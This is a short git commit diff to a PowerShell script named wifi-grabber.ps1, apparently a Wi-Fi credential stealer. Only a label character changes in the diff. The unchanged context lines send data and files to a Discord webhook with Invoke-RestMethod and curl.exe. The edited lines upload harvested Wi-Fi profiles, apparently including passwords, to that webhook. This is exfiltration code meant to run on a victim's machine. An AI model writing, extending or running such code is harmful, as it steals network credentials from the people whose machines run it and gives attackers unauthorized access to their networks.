e2b8741fc79bc4da95c4045590fb9de7edc5d9c2
nidez <pistolesi.marco@gmail.com>
2024-01-24 02:03:09 +0100

    Update wifi-grabber.ps1

--- wifi-grabber.ps1
+++ wifi-grabber.ps1
@@ -24,5 +24,5 @@ if (-not ([string]::IsNullOrEmpty($text))){
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "IT: $wifiProfiles_IT"}
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "EN: $wifiProfiles_EN"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "IT> $wifiProfiles_IT"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "EN> $wifiProfiles_EN"}
